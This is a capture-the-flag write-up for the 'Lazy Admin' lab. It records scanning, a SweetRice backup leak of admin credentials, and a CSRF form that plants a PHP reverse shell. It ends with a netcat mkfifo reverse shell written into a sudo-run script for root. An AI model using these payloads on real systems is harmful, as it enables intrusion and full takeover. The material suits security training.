# Lazy Admin

IP - 10.10.183.245


## Scanning and Enumeration

nmap -
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods:
|  Supported Methods: GET HEAD POST OPTIONS
```


dirsearch - 
```
[14:06:23] 403 -   278B - /.php

[14:06:23] 403 -   278B - /.php3

[14:06:46] 301 -   316B - /content  ->  http://10.10.183.245/content/

[14:06:47] 200 -    2KB - /content/

[14:06:54] 200 -   11KB - /index.html

[14:07:09] 403 -   278B - /server-status

[14:07:09] 403 -   278B - /server-status/
```



Found out website can be accessed through this path - /content/as

![image](https://github.com/user-attachments/assets/51bafbb8-adff-44f7-a2a5-12551b7fbb69)


## Exploit
- Found SweetRice backup disclosure that allows you to access all mysql backup and download it.

reference - https://www.exploit-db.com/exploits/40718
![image](https://github.com/user-attachments/assets/0b749176-2249-4032-acb1-ea09d1964fac)


- Inside the file there is username and password to log in as "admin".
![image](https://github.com/user-attachments/assets/9a346bcd-f5b9-4532-8086-7b4cba808d90)


## Crack the Hash
![image](https://github.com/user-attachments/assets/e79a5b30-aa5f-4f72-88b9-b92cc96e7465)

- Successfully logged in using: Username: manager  |  Password: Password123
![image](https://github.com/user-attachments/assets/d731429e-a0a3-4dcb-b57b-9b80688c913f)


- Followed the instructions first saw at the beginning of the lab in http://10.10.51.35/content/ "If you are the webmaster,please go to Dashboard -> General -> Website setting and uncheck the checkbox "Site close" to open your website."

- Went back to http://10.10.51.35/content/ and refreshed the page.

![image](https://github.com/user-attachments/assets/a8bd759c-3a56-444b-a416-48fe396b60fc)

## PHP Reverse Shell
Found a vulnerability by using searchexploit (SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Ex | php/webapps/40700.html)


![image](https://github.com/user-attachments/assets/890c43c5-f2f2-43a4-b6e2-ee1ea0587c61)


Successfully gained php reverse shell by modifying it and adding it to the ads code and saving it in the website:
```
<html>
<body onload="document.exploit.submit();">
  <form action="http://10.10.51.35/content/as/?type=ad&mode=save" method="POST" name="exploit">
    <input type="hidden" name="adk" value="shell"/>
    <textarea name="adv">
<?php
$ip = '10.6.41.41';
$port = 4444;
$sock=fsockopen($ip, $port);
$proc=proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
    </textarea>
  </form>
</body>
</html>

```

![image](https://github.com/user-attachments/assets/92c6a103-5184-47c7-acdb-ccfe55461180)

- Found user.txt inside /home/itguy directory

## Privilege Escalation/Reverse Shell

Found this information: 
```
$ sudo -l
User www-data may run the following commands on THM-Chal:
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
- This means -  (user www-data) can run the script /home/itguy/backup.pl as root using sudo, without a password.

```
$ cat [backup.pl](http://backup.pl/)
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
- The script uses Perl to run /etc/copy.sh using sh. So if I can edit /etc/copy.sh, I can control what runs as root.

- To get the reverse shell I ran this command first:

reference: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```
echo 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.6.41.41 8000 > /tmp/f' > /etc/copy.sh
```
- This is a netcat reverse shell using only sh, not bash (which avoids syntax errors).

- Opened a new tab and ran netcat and went back to the terminal and executed this command:
```
sudo /usr/bin/perl /home/itguy/backup.pl
```

- Successfully got a reverse shell to the machine with root permissions and found the root.txt flag.

![image](https://github.com/user-attachments/assets/d867cfc7-8a9d-4038-a6c4-72fba1e02a36)


